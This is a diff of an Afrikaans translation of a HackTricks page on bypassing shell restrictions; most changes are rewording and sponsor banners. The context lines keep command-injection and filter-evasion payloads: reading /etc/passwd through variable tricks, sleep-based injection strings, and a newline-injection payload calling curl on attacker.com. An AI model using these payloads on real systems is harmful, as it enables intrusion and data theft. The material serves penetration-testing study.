@@ -6,15 +6,15 @@
 
 Ander maniere om HackTricks te ondersteun:
 
-* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
+* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
 * Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling van eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.
 
 </details>
 
-<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 \
 Gebruik [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) om maklik te bou en **werkstrome outomatiseer** wat aangedryf word deur die wêreld se **mees gevorderde** gemeenskapshulpmiddels.\
@@ -126,7 +126,7 @@ g # These 4 lines will equal to ping
 $u $u # This will be saved in the history and can be used as a space, please notice that the $u variable is undefined
 uname!-1\-a # This equals to uname -a
 ```
-### Omgrens backslash en streepje
+### Oorbrug backslash en streepjie
 ```bash
 cat ${HOME:0:1}etc${HOME:0:1}passwd
 cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
@@ -159,14 +159,14 @@ time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
 echo ${LS_COLORS:10:1} #;
 echo ${PATH:0:1} #/
 ```
-### DNS data eksfiltrasie
+### DNS data uitlekking
 
 Jy kan byvoorbeeld **burpcollab** of [**pingb**](http://pingb.in) gebruik.
 
 ### Ingeboude funksies
 
-In die geval dat jy nie eksterne funksies kan uitvoer nie en slegs toegang het tot 'n **beperkte stel ingeboude funksies om RCE te verkry**, is daar 'n paar handige truuks om dit te doen. Gewoonlik sal jy **nie al die** **ingeboude** funksies kan gebruik nie, dus jy moet **al jou opsies ken** om te probeer om die tronk te omseil. Idee van [**devploit**](https://twitter.com/devploit).\
-Eerstens, kyk na al die [**shell ingeboude**](https://www.gnu.org/software/bash/manual/html\_node/Shell-Builtin-Commands.html)**.** Dan het jy hierdie **aanbevelings**:
+In die geval waar jy nie eksterne funksies kan uitvoer nie en slegs toegang het tot 'n **beperkte stel ingeboude funksies om RCE te verkry**, is daar 'n paar handige truuks om dit te doen. Gewoonlik sal jy **nie al die** ingeboude funksies kan gebruik nie, dus jy moet **al jou opsies ken** om te probeer om die tronk te omseil. Idee van [**devploit**](https://twitter.com/devploit).\
+Eerstens, kyk na al die [**shell ingeboude funksies**](https://www.gnu.org/software/bash/manual/html\_node/Shell-Builtin-Commands.html)**.** Dan het jy hierdie **aanbevelings**:
 ```bash
 # Get list of builtins
 declare builtins
@@ -223,7 +223,7 @@ if [ "a" ]; then echo 1; fi # Will print hello!
 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
 /*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
 ```
-### Oorloop potensiële regexes
+### Oorloop moontlike regexes
 ```bash
 # A regex that only allow letters and numbers might be vulnerable to new line characters
 1%0a`curl http://attacker.com`
@@ -315,9 +315,9 @@ ln /f*
 'sh x'
 'sh g'
 ```
-## Lees-Alleen/Noexec/Distroless Omgang
+## Lees-Slegs/Noexec/Distroless Omgang
 
-Indien jy binne 'n lêersisteem met die **lees-alleen en noexec-beskermings** of selfs in 'n distroless houer is, is daar steeds maniere om **arbitrêre binêre lêers uit te voer, selfs 'n skaal!:**
+Indien jy binne 'n lêersisteem met die **lees-slegs en noexec-beskermings** of selfs in 'n distroless houer is, is daar steeds maniere om **arbitrêre binêre lêers uit te voer, selfs 'n skaal!:**
 
 {% content-ref url="../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/" %}
 [bypass-fs-protections-read-only-no-exec-distroless](../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/)
@@ -336,10 +336,10 @@ Indien jy binne 'n lêersisteem met die **lees-alleen en noexec-beskermings** of
 * [https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
 * [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secjuice.com/web-application-firewall-waf-evasion/)
 
-<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 \
-Gebruik [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) om maklik te bou en **outomatiseer werkstrome** aangedryf deur die wêreld se **mees gevorderde** gemeenskaplike gereedskap.\
+Gebruik [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) om maklik te bou en **outomatiseer werkstrome** aangedryf deur die wêreld se **mees gevorderde** gemeenskapshulpmiddels.\
 Kry Vandag Toegang:
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
@@ -352,7 +352,7 @@ Ander maniere om HackTricks te ondersteun:
 
 * As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
 * Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling van eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.
 
